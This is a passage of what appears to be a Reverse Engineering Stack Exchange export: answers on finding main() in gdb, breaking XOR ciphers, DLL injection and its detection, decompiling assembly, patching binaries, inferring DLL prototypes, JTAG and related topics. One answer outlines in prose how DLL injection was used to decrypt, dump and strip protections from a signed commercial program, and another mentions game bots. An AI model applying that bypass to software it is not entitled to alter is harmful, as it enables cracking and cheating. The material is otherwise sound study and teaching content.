   0x00000000004048b9:  mov    $0x4028c0,%rdi
   0x00000000004048c0:  callq  0x4024f0 &lt;__libc_start_main@plt&gt;
   0x00000000004048c5:  hlt    
   0x00000000004048c6:  nopw   %cs:0x0(%rax,%rax,1)
End of assembler dump.
</code></pre>

<p>What follow the <code>hlt</code> is just rubbish obtained because of the linear sweep performed by <code>gdb</code>. So, just ignore it. What is relevant is the fact that we are calling <code>__libc_start_main</code> (I won't comment on the <code>@plt</code> because it would drag us out of the scope of the question). </p>

<p>In fact, the procedure <code>__libc_start_main</code> initialize the memory for a process running with the <code>libc</code> dynamic library. And, once done, jump to the procedure located in <code>%rdi</code> (which usually is the <code>main</code> procedure).</p>

<p>So, indeed, the address of the <code>main</code> procedure is <code>0x4028c0</code>. Let disassemble the code at this address:</p>

<pre><code>(gdb) x /10i 0x4028c0
   0x4028c0:    push   %r15
   0x4028c2:    push   %r14
   0x4028c4:    push   %r13
   0x4028c6:    push   %r12
   0x4028c8:    push   %rbp
   0x4028c9:    mov    %rsi,%rbp
   0x4028cc:    push   %rbx
   0x4028cd:    mov    %edi,%ebx
   0x4028cf:    sub    $0x388,%rsp
   0x4028d6:    mov    (%rsi),%rdi
   ...
</code></pre>

<p>And, if you look at it, this is indeed the <code>main</code> procedure. So, this where to really start the analysis.</p>

<h2>Words of warning</h2>

<p>Even if this way of looking for the <code>main</code> procedure will work in most the cases. You have to know that we strongly rely on the following hypothesis:</p>

<ol>
<li><p>The program has been compiled and do not start straight at the <code>_start</code> procedure (at the entrypoint). Programs written in assembler and compiled with <code>gcc -nostdlib</code> won't have a first call to <code>__libc_start_main</code> and will start straight from the entrypoint.</p></li>
<li><p>We also strongly rely on a knowledge on the way <code>__libc_start_main</code> works. And, how this procedure has been designed by the <code>gcc</code> team. So, if the program your analyzing has been compiled with another compiler, you may have to investigate a bit further about this compiler and how it perform the set-up of the memory before running the <code>main</code> procedure.</p></li>
</ol>

<p>Anyway, you should now be able to track down a program with no symbol at all if you read this answer carefully.</p>
","3816"
"What is the most efficient way to detect and to break xor encryption?","28370","","<p>I know that modern cryptographic algorithms are as close as they can to fully random data (<a href=""http://en.wikipedia.org/wiki/Ciphertext_indistinguishability"">ciphertext indistinguishability</a>) and that trying to detect it is quite useless. But, what can we do on weak-crypto such as <strong>xor encryption</strong> ? Especially if we can get statistical studies of what is encrypted ? </p>

<p>What are the methods and which one is the most efficient (and under what hypothesis) ? And, finally, how to break efficiently this kind of encryption (only based on a statistical knowledge of what is encrypted) ?</p>
","<p>XOR encryption with a short pad (i.e., shorter than the plaintext) is basically the Vigenère cipher. So <a href=""http://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher#Cryptanalysis"">standard techniques to break Vigenère</a> should break xor encryption.</p>

<p>The basic idea is that if the encryption key is <strong>d</strong> symbols long, every <strong>d</strong>-th symbol is encrypted with the same pad. Thus, take every <strong>d</strong>-th ciphertext symbol and treat it like simple substitution cipher, break that and you have the 1st symbol of the key. Repeat for the <strong>d+1</strong>-th ciphertext symbols, <strong>d+2</strong>-th ciphertext symbols, etc. Eventually you will have all <strong>d</strong> symbols of the key.</p>

<p>To break the <a href=""http://en.wikipedia.org/wiki/Substitution_cipher"">simple substitution</a> ciphers, you might try brute force (if the symbol set is small) and compare possible plaintexts with the statistical data you know. For certain plaintexts (english language for example) you can often break most of it even quicker (e.g., with english language text the most frequent symbol in ciphertext probably maps back to an <em>e</em>, etc). </p>

<p>Now, you may be thinking, what if you don't know <strong>d</strong>. Often with Vigenère, the length of the key is brute forced. Try d=1, d=2, d=3,... For each d, see how well the output plaintext matches the statistical data. Return the key for which the plaintext most closely matched the statistical data.</p>
","2063"
"What is DLL Injection and how is it used for reversing?","24992","","<p>I was reading a discussion about dumping a processes part of a process's memory and someone suggested using DLL injection to do this. I'll be honest in that I don't really understand. How does DLL injection work and what kinds of reversing tasks can you do with it?</p>
","<p><a href=""https://reverseengineering.stackexchange.com/a/2253/2676"">DCoder's answer</a> is a good one.  To expand somewhat, I most often use DLL injection in the context of forcing an existing process to load a DLL through CreateRemoteThread.  From there, the entrypoint of the DLL will be executed by the operating system once it is loaded.  In the entrypoint, I will then invoke a routine that performs in-memory patching of all of the locations within the original binary that interest me, and redirects their execution into my DLL via a variety of modifications.  If I am interested in modifying or observing the process' interaction with some imported function, then I will overwrite the IAT entry for that function and replace it with a pointer to something that I control.  If I want to do the same with respect to some function that exists within the binary, I will make some sort of detours-style patch at the beginning of the function.  I can even do very surgical and targeted hooks at arbitrary locations, akin to old-school byte patching.  My DLL does its business within the individual hooks, and then is programmed to redirect control back to the original process.</p>

<p>DLL injection provides a platform for manipulating the execution of a running process.  It's very commonly used for logging information while reverse engineering.  For example, you can hook the IAT entry for a given imported operating system library function, and then log the function arguments onto disk.  This provides you a data source that can assist in rapidly reverse engineering the target.</p>

<p>DLL injection is not limited to logging, though.  Given the fact that you have free reign to execute whatever code that you want within the process' address space, you can modify the program in any way that you choose.  This technique is frequently used within the game hacking world to code bots.  </p>

<p>Anything that you could do with byte patching, you can do with DLL injection.  Except DLL injection will probably be easier and faster, because you get to code your patches in C instead of assembly language and do not have to labor over making manual modifications to the binary and its PE structure, finding code caves, etc.  DLL injection almost entirely eliminates the need for using assembly language while making modifications to a binary; the only assembly language needed will be small pieces of code nearby the entrance and exit to a particular hook to save and restore the values of registers / the flags.  It also makes binary modification fast and simple, and does not alter any cryptographic signatures of the executable that you are patching.</p>

<p>DLL injection can be employed to solve highly non-trivial reverse engineering problems.  The following example is necessarily vague in some respects because of non-disclosure agreements.</p>

<p>I had a recurring interest in a program that was updated very frequently (sometimes multiple times daily).  The program had a number of sections in it that were encrypted on disk after compilation time and had to be decrypted at run-time.  That was accomplished by calling into the kernel through a function inside of a DLL that shipped with the program with the number of the section and a Boolean that indicated whether the section should be encrypted or decrypted.  All of the components were digitally signed.</p>

<p>I employed a DLL injection-based solution that worked as follows:</p>

<ul>
<li>Create the process suspended.</li>
<li>Inject the DLL.</li>
<li>DLL hooks GetProcAddress in the program's IAT.</li>
<li>GetProcAddress hook waits for a specific string to be supplied and then returns its own hooked version of that function.</li>
<li>The hooked function inspects the return address on the stack two frames up to figure out the starting address of the function (call it Func) that called it.</li>
<li>The hooked function then calls Func for each encrypted section, instructing it to decrypt each section.  To make this work, the hooked function has to pass on the calls to the proper function in the DLL for these calls.</li>
<li>After having done so, for every subsequent call to the hooked function, it simply returns 1 as though the call was successful.</li>
<li>Having decrypted all the sections, the DLL now dumps the process' image onto the disk and reconstructs the import information.</li>
<li>After that it does a bunch of other stuff neutralizing the other protections.</li>
</ul>

<p>Initially I was doing all of this by hand for each new build.  That was way too tedious.  One I coded the DLL injection version, I never had to undertake that substantial and manual work ever again.</p>

<p>DLL injection is not widely known or used within reverse engineering outside of game hacking.  This is very unfortunate, because it is an extremely powerful, flexible, and simple technique that should be part of everyone's repertoire.  I have used it dozens of times and it seems to find a role in all of my dynamic projects.  The moment my task becomes too cumbersome to do with a debugger script, I switch to DLL injection.</p>

<p>In the spectrum of reverse engineering techniques, every capability of DLL injection is offered by dynamic binary instrumentation (DBI) tools as well, and DBI is yet more powerful still.  However, DBI <a href=""http://blog.coresecurity.com/2012/06/22/recon-2012-presentation-detecting-dynamic-binary-instrumentation-frameworks/"" rel=""nofollow noreferrer"">is not stealthy</a> and incurs a serious overhead in terms of memory consumption and possibly performance.  I always try to use DLL injection before switching to DBI.</p>

<p>For some resources on DLL injection, there's a great eight-part series on writing a DLL injection-based poker bot.  See <a href=""http://www.codingthewheel.com/tags/poker-bot/"" rel=""nofollow noreferrer"">here</a>; start from the bottom and read the numbered entries in order.</p>
","2255"
"How can DLL injection be detected?","23605","","<p>In <a href=""https://reverseengineering.stackexchange.com/questions/2252/what-is-dll-injection-and-how-is-it-used-for-reversing"">this question on DLL injection</a> multiple answers mention that DLL injection can be used to modify games, perhaps for the purposes of writing a bot. It seems desirable to be able to detect DLL injection to prevent this from happening. Is this possible?</p>
","<p>There are multiple ways that you can use which <em>might</em> work (and see below for the reasons why they might not).  Here are two:</p>

<ul>
<li>A process can debug itself, and then it will receive notifications of DLL loading.</li>
<li>A process can host a TLS callback, and then it will receive notifications of thread creation.  That can intercept thread creation such as what is produced by CreateRemoteThread.  If the thread start address is LoadLibrary(), then you have a good indication that someone is about to force-load a DLL.</li>
</ul>

<p>Other than that, you can periodically enumerate the DLL name list, but all of these techniques can be defeated by a determined attacker (debugging can be stopped temporarily; thread notification can be switched off; the injected DLL might not remain loaded long enough because it might use dynamically-allocated memory to host itself and then unload the file, etc).</p>
","2281"
"Sniffing TCP traffic for specific process using Wireshark","22310","","<p>Is it possible to sniff TCP traffic for a specific process using Wireshark, even through a plugin to filter TCP traffic based on process ID?</p>

<p>I'm working on Windows 7, but I would like to hear about solution for Linux as well.</p>
","<p>Process Attribution In Network Traffic (PAINT)/Wireshark from DigitalOperatives might be what you're looking for. It's based on Wireshark 1.6.5, and it works with Windows&nbsp;Vista and above. It <a href=""http://www.digitaloperatives.com/paint/index.html"" rel=""noreferrer"">has been released to the public</a> in December 2012 for research purposes, and I've been using it since then. Not only does it work - you can filter the traffic through the columns - but it's quite fast.</p>

<p>The blog post <em><a href=""http://digitaloperatives.blogspot.com.br/2012/10/process-attribution-in-network-traffic.html"" rel=""noreferrer"">Process Attribution In Network Traffic</a></em> from their developers explains it in detail.</p>

<p><img src=""https://i.stack.imgur.com/aPPng.png"" alt=""Screenshot, taken from the blog post linked above""></p>
","1987"
"Translate ASSEMBLY to C","21599","","<p>-2
down vote
favorite</p>

<p>How to translate code assembly to C?? I am very poor in assembly code. EG:</p>
","<p>Here is exact answer to you question.</p>

<ol>
<li>Go to <a href=""http://www.tutorialspoint.com/compile_assembly_online.php"" rel=""nofollow"">http://www.tutorialspoint.com/compile_assembly_online.php</a></li>
<li>Doubleclick on main.asm in upper-left corner of the screen</li>
<li><p>Copy your snippet to the text window. You'll need to add definition of data and make some tweaks, my resulting assembly code is</p>

<pre><code>section     .text
global main
main:

xor ebp,ebp

mov      dword [ebp+data], 0x612E2F47
mov      dword [ebp+data+4], 0x5B2A451C
mov      dword [ebp+data+8], 0x6E6B5E18
mov      dword [ebp+data+0Ch], 0x5C121F67
mov      dword [ebp+data+10h], 0x0D5E2223
mov      dword [ebp+data+14h], 0x5E0A5F1D 
mov      dword [ebp+data+18h], 0x858
mov      dword [ebp+data+1Ah], 0x0
xor     eax, eax                
loc_4012B2:                             
add     [ebp+eax+data], al      
inc     eax                     
cmp     eax, 1Ah                
jl      short loc_4012B2
nop
nop


section     .data

data    db 0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0
</code></pre></li>
<li><p>Press compile button</p></li>
<li>Go to project menu, download the project, extract <code>demo</code> file from the archive </li>
<li>Go to <a href=""https://retdec.com/decompilation/"" rel=""nofollow"">retdec decompiler site</a></li>
<li>Select executable input file and upload your binary file there</li>
<li>Press decompile</li>
<li>See results</li>
</ol>

<p>I wouldn't say that results of this translation to C code are too much understandable.
In addition I'd like to note that learning 6 assembly commands is much less time consuming process.</p>
","10925"
"How do I add functionality to an existing binary executable?","21003","","<p>I want to add some functionality to an existing binary file. The binary file was created using <code>gcc</code>. </p>

<ul>
<li>Do I need to decompile the binary first, even though I sufficiently understand the functioning of the program ? </li>
<li>How should I go about adding the necessary code ?</li>
<li>Do I need any tools to be able to do this ?</li>
</ul>
","<p>There are several broad ways in which you could do this.</p>

<ol>
<li><p>Dynamic instrumentation</p>

<p>Tools such as <a href=""http://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool"">PIN</a>, <a href=""http://valgrind.org/"">Valgrind</a>, or <a href=""http://www.dynamorio.org/"">DynamoRIO</a> allow you to dynamically change the behavior of a program.  For instance, you can add calls to new functions at particular addresses, intercept library calls and change them, and much more.</p>

<p>The downside is that dynamic instrumentation often has high overhead.</p></li>
<li><p>Static instrumentation</p>

<p>You can also try to statically modify the program to add the desired behavior.  One challenge is that you often need to muck around with the executable file format.  Some tools, such as <code>elfsh</code> from the <a href=""http://www.eresi-project.org/"">ERESI</a> project exist for this, but I have found them buggy and difficult to use.</p>

<p>Another strategy for static instrumentation is to ""recompile"".  You can do this by decompiling the program, modifying the source code, and recompiling.  In theory, you could also use a tool like <a href=""http://bap.ece.cmu.edu"">BAP</a> to lift the program to IL, modify it, and then re-compile it using LLVM.  However, the current version is probably not mature enough for this.</p></li>
<li><p>Dynamic loading</p>

<p>You can use <code>LD_PRELOAD</code> to override functions that are going to be dynamically linked.  This is a nice option when you want to change the behavior of a library function.  Naturally, it does not work on statically linked binaries, or for static functions.</p></li>
<li><p>Binary patching</p>

<p>You can often make simple changes to a binary using a hex-editor.  For instance, if there is a function call or branch you would like to skip, you can often replace it with <code>nop</code> instructions.  If you need to add a large amount of new code, you will probably need to use something like <code>elfsh</code> from the <a href=""http://www.eresi-project.org/"">ERESI</a> project to help you resize the binary.</p></li>
</ol>
","192"
"Get the function prototypes from an unknown .dll","19538","","<p>I have an unknown .dll from another program which I want to work with. With <a href=""http://www.nirsoft.net/utils/dll_export_viewer.html"">DLL Export Viewer</a> I was able to find the exported functions.</p>

<p><img src=""https://i.stack.imgur.com/qIDYL.png"" alt=""enter image description here""></p>

<p>But to call them I need the information about the parameters and the return type. </p>

<ul>
<li>Is there an easy way to identify them in the disassembly?</li>
<li>Do tools exist which can extract those prototypes, or help me in a way?</li>
</ul>
","<p><strong>Note:</strong> I am assuming 32bit x86 on Windows, your question unfortunately doesn't state for certain. But since it's Windows and you don't explicitly mention x64 this was the sanest assumption I could make.</p>

<p>First off, try to search for the function names with a search engine. Don't just settle for a single search engine. Failing that, inspect whatever came in the package with the DLL. Are there import LIBs included? If so, use these to provide clues (may or may not work).</p>

<h2>Otherwise ...</h2>

<p>Most disassemblers (read the tag wiki <a href=""/questions/tagged/tools"" class=""post-tag"" title=""show questions tagged &#39;tools&#39;"" rel=""tag"">tools</a>) will readily show you exported functions. So <em>locating</em> them won't be a problem at all. They will also usually be shown with their exported names.</p>

<p>From the output your screenshot shows, it looks like the names aren't <a href=""https://en.wikipedia.org/wiki/Name_mangling"" rel=""nofollow noreferrer"">mangled/decorated</a>. This suggests - but is <em>not</em> conclusive <em>proof</em> - that the functions use the <code>stdcall</code> <a href=""https://en.wikipedia.org/wiki/Calling_convention"" rel=""nofollow noreferrer"">calling convention</a> (better yet read <a href=""http://code.google.com/p/corkami/wiki/CallingConventions"" rel=""nofollow noreferrer"">this one by Ange</a>, one of the moderators pro temp here). Now I don't know how much you know, but since you attempt RCE you are probably well-versed in calling conventions. If not let's sum it up like this: calling conventions govern how (order, alignment) and by what means (registers, stack) parameters get passed to functions. We'll get back to this in a moment. If you are on x64 Windows and the DLL is 64bit as well, you can rely on the Microsoft x64 calling convention (read <a href=""https://en.wikipedia.org/wiki/X86_calling_conventions"" rel=""nofollow noreferrer"">this article</a>).</p>

<h2>Now there are two main routes you can take</h2>

<h3>Route 1 - analyze a program using the DLL</h3>

<p>If you happen to have a program that uses the DLL in question, you can use a debugger or disassembler to find out both the calling convention and the number of parameters passed. Simply look out for <code>call</code> instructions referencing the exported DLL functions and find <code>mov</code> or <code>push</code> instructions in front. If you happen to come across <code>cdecl</code> functions, the stack pointer (<code>esp</code>) will be adjusted again after the <code>call</code>. It's possible this is the case (see below for an example), but as unlikely as the various compiler-specific <code>fastcall</code> variants, since <code>stdcall</code> provides the broadest possible compatibility.</p>

<p>The methods outlined below in the second approach will also explain some of the concepts introduced here in greater detail.</p>

<h3>Route 2 - analyzing the DLL itself</h3>

<p>If you happen to have IDA and you analyze a 32bit DLL, chances are that IDA already identified the number of parameters and the calling convention using its heuristics. Let me demonstrate (using <code>sqlite3.dll</code>). In the Exports tab find a function you're interested in and double-click it. This will take you to the address where the function starts (here <code>sqlite3_open</code>).</p>

<p><img src=""https://i.stack.imgur.com/jdRup.png"" alt=""enter image description here""></p>

<p>As you can see IDA readily found that the function takes two arguments (you can look at <a href=""http://www.sqlite.org/c3ref/open.html"" rel=""nofollow noreferrer"">the SQLite3 docs</a> to verify this finding). However, there is another thing here. After the <code>call sqlite3_open_v2_0</code> we can see that the stack pointer is adjusted by 10h (=16) thereby cleaning up four parameters. Looking at the <code>push</code> instructions before the <code>call</code> we can see that indeed four 32bit (i.e. DWORD) parameters are passed via the stack.
Since there is no further cleanup on part of the function <code>sqlite3_open</code> itself, it is now clear that it is likely following the C calling convention (<code>cdecl</code>) as well. Again we can verify the finding (a benefit you won't have) by looking at the documentation. And indeed since no explicit calling convention is given, you end up defaulting to <code>cdecl</code>. The single <code>retn</code> (some disassemblers will show <code>ret</code>), meaning <code>return</code>, also doesn't clean up the stack, since otherwise it would look like <code>retn 8</code> or similar.</p>

<p>This is a rather small function, but even with the circumstantial information we are able to deduce a lot about it.</p>

<p>Now for something <code>stdcall</code>, a case you are more likely to encounter as mentioned before. And why not go for something famous, like, say, <code>kernel32.dll</code> from Windows 7? Again, I'll take a trivial function as it is better to showcase the points. Note that I told IDA not to make use of the debug symbols from Microsoft and to skip using FLIRT signatures. This means some of the good stuff that kicks in by default is being suppressed to show how to identify what's going on. Look:</p>

<p><img src=""https://i.stack.imgur.com/nZ9Di.png"" alt=""enter image description here""></p>

<p>The green lines are uninteresting for our case, but you'll encounter them a lot. It is commonly found in several compilers and <code>ebp</code> is commonly referred to as ""frame pointer"" (frame as in stack frame), basically an offset on which to base access to the stack variables. You can see a typical use in the line <code>push [ebp+arg_0]</code>. IDA figured this out and shows us <code>Attributes: bp-based frame</code>.</p>

<p>We see no adjustment of the stack pointer after <code>call sub_77E29B80</code>, so it looks like that (internal) function follows the <code>stdcall</code> calling convention as well. However, the <code>ret 4</code> hints that the callee (i.e. the function <code>AddAtomA</code> in this case) is meant to clean up the stack, which means we can exclude <code>cdecl</code> as a possibility. It's four bytes because that is the ""natural"" size on a 32bit system. You can also see from my inline comments, that parameters are passed on the stack in reverse. But you should know such things anyway before engaging in RCE, otherwise read up in the above linked articles and in some books such as <a href=""https://reverseengineering.stackexchange.com/a/1755/245"">those here</a>.</p>

<p>In this particular case we could dare to make another assumption, but it could bite us. Say this was Microsoft's <code>fastcall</code> convention (keep in mind that they vary by compiler), then the registers <code>ecx</code> and <code>edx</code> would be used, followed by arguments passed on the stack. This means that in our case we might want to assume that this can't be the case, because those registers aren't saved before calling <code>sub_77E29B80</code>. This is a good argument for machine-generated code such as this one. However, were this hand-optimized code, the programmer could rely on the knowledge about the calling convention and skip saving/restoring the registers before/after the <code>call</code>. Still, in this case hand-optimized code would be less likely (or unlikely) to make use of the frame pointer. It's three instructions that aren't strictly needed to do the job. So arguing like this - even without prior knowledge - we could now set out to write a little program using the prototype:</p>

<pre><code>int __stdcall AddAtomA(void* unknown)
</code></pre>

<p>and use a debugger to see <em>what</em> gets passed. It's generally a tedious process, but a lot of the process - especially finding the number of parameters - can likely be scripted. Also, once you have a single function figured out, it's likely that the calling convention would be the same (exceptions exist, of course) throughout the DLL. Just make sure you analyze a function taking at least one parameter, otherwise you won't be able to distinguish between <code>stdcall</code> and <code>cdecl</code> from the circumstantial data.</p>

<h3>Route X - the ugly one</h3>

<p>You can also simply use <code>dumpbin</code> or a similar tool to script the creation of a test program. This test program would then call the function, check the stack pointer before and after and could thereby distinguish between <code>stdcall</code> and <code>cdecl</code>. You could also play tricks like passing 20 arguments on the stack (if you want to assume <code>stdcall</code> for the experiment) and see how much of that your callee cleaned up. There are loads of possibilities to simply try instead of analyze. But you'll get better (more reliable) results with the first two approaches.</p>

<p>If you need to build an import LIB because you don't want to use <code>GetProcAddress</code>, see <a href=""https://stackoverflow.com/a/15117763/476371"">this answer by me over on StackOverflow</a>. It shows how to build an import LIB  just from the DLL.</p>

<h2>Conclusion</h2>

<p>The methods won't differ too much with other disassemblers, I just needed to show things in a way you can reproduce them, that's why I went with IDA. The freeware edition of IDA will likely be sufficient (32bit, PE, x86) - keep in mind it's not permissible for commercial use, though.</p>

<p>Screenshots taken from IDA 6.4.</p>
","2135"
"Where to find (free) training in reverse engineering?","19412","","<p>Can someone give a list of websites with good (and free) reverse engineering training exercises ?</p>
","<p>The organisation OpenSecurityTraining offers <a href=""http://opensecuritytraining.info/Training.html"" rel=""noreferrer"">free training materials</a> under creative commons type licenses. Many of the training's are <a href=""http://www.youtube.com/user/OpenSecurityTraining/videos?view=1&amp;flow=grid"" rel=""noreferrer"">videos</a>, while others are slide decks and related class materials (scripts, malware samples and so on). The course-ware comes under 3 categories and features the following items (Which I have edited to include the RE related material):</p>

<p><strong>Beginner:</strong></p>

<ul>
<li><a href=""https://www.youtube.com/playlist?list=PL038BE01D3BAEFDB0"" rel=""noreferrer"">Introductory Intel x86</a>: Architecture, Assembly, Applications, &amp; Alliteration </li>
<li><a href=""https://www.youtube.com/playlist?list=PLUFkSN0XLZ-n91t_AX5zO007Giz1INwPd"" rel=""noreferrer"">Introduction to ARM</a> </li>
<li><a href=""https://www.youtube.com/playlist?list=PLUFkSN0XLZ-n_Na6jwqopTt1Ki57vMIc3"" rel=""noreferrer"">The Life of Binaries</a> </li>
<li><a href=""https://www.youtube.com/playlist?list=PLUFkSN0XLZ-kqYbGpY4Gt_VATd4ytQg-Z"" rel=""noreferrer"">Malware Dynamic Analysis</a></li>
<li><a href=""https://www.youtube.com/playlist?list=PLUFkSN0XLZ-kBgdLhorJD6BR66D5kGoUV"" rel=""noreferrer"">Introduction to Trusted Computing</a></li>
</ul>

<p><strong>Intermediate:</strong></p>

<ul>
<li><a href=""https://www.youtube.com/playlist?list=PL8F8D45D6C1FFD177"" rel=""noreferrer"">Intermediate Intel x86</a>: Architecture, Assembly, Applications, &amp; Alliteration </li>
<li><a href=""https://www.youtube.com/playlist?list=PL96AB65DFCE02EE3E"" rel=""noreferrer"">Introduction to Software Exploits</a></li>
<li><a href=""https://www.youtube.com/playlist?list=PL9F9E52502327B1CA"" rel=""noreferrer"">Exploits 2: Exploitation in the Windows Environment</a></li>
</ul>

<p><strong>Advanced:</strong></p>

<ul>
<li><a href=""https://www.youtube.com/playlist?list=PLF58FB7BCB20ED11A"" rel=""noreferrer"">Rootkits: What they are, and how to find them</a> </li>
<li><a href=""https://www.youtube.com/playlist?list=PLUFkSN0XLZ-nXcDG89jS9iqKBnNHmz7Qw"" rel=""noreferrer"">Introduction to Reverse Engineering Software</a> </li>
<li>Reverse Engineering Malware</li>
<li>Advanced x86: Virtualization with Intel VT-x</li>
</ul>

<p>Disclosure: I am not associated with OpenSecurityTraining in any way and have only worked through a small portion of their total offerings. Seems like a great resource though.</p>
","267"
"How do I identify and use JTAG?","18545","","<p>I'm a software guy through and through.  But periodically when I'm taking apart hardware I know to look for JTAG ports and RS232 ports.  So far I've always been lucky and have been able to solder on pins to the RS232 port and get a serial connection.</p>

<p>For the times in the future that I am unlucky, can someone explain to me what JTAG is (i.e. is there only one type of JTAG and I can expect to hook it up to a single type of port, like a DB-9 for serial?) and how I would go about using it to dump firmware off an embedded system or is it all manufacturer specific?</p>
","<p>There are a few JTAG connectors available, so it's hard to tell which one, and how the pins are positioned.</p>

<p>I suggest you take a magnifying glass and read the microcontroller model.  With the model you will be able to find the datasheet on the Internet.
Take a look at the PIN out of the microcontroller, and see how many JTAG outputs it has. Some newer chips have trace outputs, some don't. This can really narrow down your options.</p>

<p>You might want to take a look <a href=""http://support.code-red-tech.com/CodeRedWiki/HardwareDebugConnections"">here</a>, for a a quick look on various JTAG connectors.</p>

<p>Another thing worth mentioning, various microcontroller, have a specific bit, that when it set, the JTAG connectors are disabled. This is done on release, to make sure that no one tries to steal the firmware or to debug the system.
The only way to enable the JTAG again is to hard reset the microcontroller. This will cause complete reset of the internal flash, so all the firmware will be lost...</p>
","1382"
"convert this x86 ASM to C?","18482","","<p>How could this 32-bit x86 assembly be written in C?</p>

<pre><code>loc_536FB0:
mov cl, [eax]
cmp cl, ' '
jb short loc_536FBC
cmp cl, ','
jnz short loc_536FBF

loc_536FBC:
mov byte ptr [eax], ' '

loc_536FBF
mov cl, [eax+1]
inc eax
test cl, cl
jnz short loc_536FB0
</code></pre>

<p>I have already figured out that it is a for loop that loops 23 times before exiting.</p>
","<p>Such small snippets are not too hard to decompile manually. Let's try it.</p>

<p>You have already figured out that <code>cl</code> holds a character, this means that <code>eax</code> where it's read from is a pointer to a character array. Let's call it <code>p</code>. Now, let's do a dumb translation for every assembly statement to C:</p>

<pre><code>l1:            ; l1:
mov cl, [eax]  ;   cl = *p;
cmp cl, ' '    ;   if ( cl &lt; ' ' )
jb short l2    ;     goto l2
cmp cl, ','    ;   if ( cl != ',' )
jnz short l3   ;     goto l3

l2:                      ; l2:
mov byte ptr [eax], ' '  ;   *p = ' '

l3:                  ; l3:
mov cl, [eax+1]      ; cl = *(p+1)
inc eax              ; p = p + 1
test cl, cl          ; if ( cl != 0 )
jnz short l1         ;   goto l1
</code></pre>

<p>And cleaned up:</p>

<pre><code>l1:               
  cl = *p;
  if ( cl &lt; ' ' ) 
    goto l2;
  if ( cl != ',' )
    goto l3;       
l2:       
  *p = ' ';
l3:           
  cl = *(p+1);
  p = p + 1;     
  if ( cl != 0 )
    goto l1;
</code></pre>

<p>Now, let's have a look at the second <code>if</code>. It has the following form:</p>

<pre><code>if ( condition )
  goto end_of_if;
  &lt;if body&gt;
end_of_if:
</code></pre>

<p>And here's how we can get rid of the <code>goto</code>:</p>

<pre><code>if ( !condition )
{
  &lt;if body&gt;
}
</code></pre>

<p>Applying it to our snippet:</p>

<pre><code>l1:               
  cl = *p;
  if ( cl &lt; ' ' ) 
    goto l2;
  if ( cl == ',' )  {
l2:       
    *p = ' ';
  }
  cl = *(p+1);
  p = p + 1;     
  if ( cl != 0 )
    goto l1;
</code></pre>

<p>Now, how we can get rid of <code>goto l2</code>? If you look at it carefully, you can see that the body at <code>l2</code> will get executed if <em>either</em> <code>cl &lt; ' '</code> <em>or</em> <code>cl == ','</code>. So we can just combine the two conditions with a logical OR (<code>||</code>):</p>

<pre><code>l1:               
  cl = *p;
  if ( cl &lt; ' ' || cl == ',' ) {
    *p = ' ';
  }
  cl = *(p+1);
  p = p + 1;     
  if ( cl != 0 )
    goto l1;
</code></pre>

<p>Now we have one <code>goto</code> left. We have: 1) label at the beginning of a statement block 2) check at the end of the block and 3) goto to the start of the block if the check succeeded. This is a typical pattern of a <code>do-while</code> loop, and we can easily convert it:</p>

<pre><code>do {
  cl = *p;
  if ( cl &lt; ' ' || cl == ',' ) {
    *p = ' ';
  }
  cl = *(p+1);
  p = p + 1;     
} while ( cl != 0 )
</code></pre>

<p>Now the code is almost nice and pretty, but we can compress it a bit more by substituting equivalent statements:</p>

<pre><code>do {
  if ( *p &lt; ' ' || *p == ',' )
    *p = ' ';
  cl = *++p;
} while ( cl != 0 )
</code></pre>

<p>And, finally, the last assignment can be moved into the condition:</p>

<pre><code>do {
  if ( *p &lt; ' ' || *p == ',' )
    *p = ' ';
} while ( *++p != 0 )
</code></pre>

<p>Now it's obvious what the code is doing: it's going through the string, and replacing all special characters (those with codes less than 0x20 aka space) and commas with the spaces.</p>
","2099"
"How can I set a breakpoint for a button click?","18120","","<p>I am trying to find what a button does, so I want to set a breakpoint to catch button click event. Is that possible?</p>

<p>Any tools or tricks to assist in this?</p>
","<p>It very much depends on what framework they use in order to do their windowing. It could be <a href=""https://en.wikipedia.org/wiki/Microsoft_Foundation_Class_Library"">MFC</a>, <a href=""https://en.wikipedia.org/wiki/Windows_Presentation_Foundation"">WPF</a>, <a href=""https://en.wikipedia.org/wiki/WinForms"">WinForms</a>, <a href=""https://en.wikipedia.org/wiki/WTL"">WTL</a>, <a href=""http://en.wikipedia.org/wiki/Qt_%28software%29"">QT</a>, <a href=""http://en.wikipedia.org/wiki/Wxwidget"">wxWidgets</a>, pure <a href=""https://en.wikipedia.org/wiki/Windows_API"">Windows API</a>. There's a lot of frameworks and they all handle the final routing of messages differently.</p>

<p>I'll answer the question for the cases that are either directly built on top of Windows API or where they're using the Windows API directly. WPF does not use the Windows API windowing system other than for the outermost windows.</p>

<p>Initially the program registers a function that handles messages intended for a particular window. This can be done using the <a href=""http://msdn.microsoft.com/en-us/library/ms633586(v=vs.85).aspx"">RegisterClass</a> or <a href=""http://msdn.microsoft.com/en-us/library/ms633587(v=vs.85).aspx"">RegisterClassEx</a> functions. The function which will be responsible for handling the messages sent to the window is the lpfnWndProc member of the structures passed to these functions. This is called the window procedure. </p>

<p>What happens when a button is pressed is that a message, in this case <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms647591(v=vs.85).aspx"">WM_COMMAND</a>, is pushed into the thread message queue by Windows. This message is then fetched using  <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms644936(v=vs.85).aspx"">GetMessage</a> or <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms644943(v=vs.85).aspx"">PeekMessage</a>. Some messages use short cuts and can result in a call to the window procedure directly when you call GetMessage, some messages only result in a call to the window procedure when the application calls <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms644934(v=vs.85).aspx"">DispatchMessage</a>. If you're dealing with a dialog, the message will be handled by a call to <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms645498(v=vs.85).aspx"">IsDialogMessage</a>.</p>

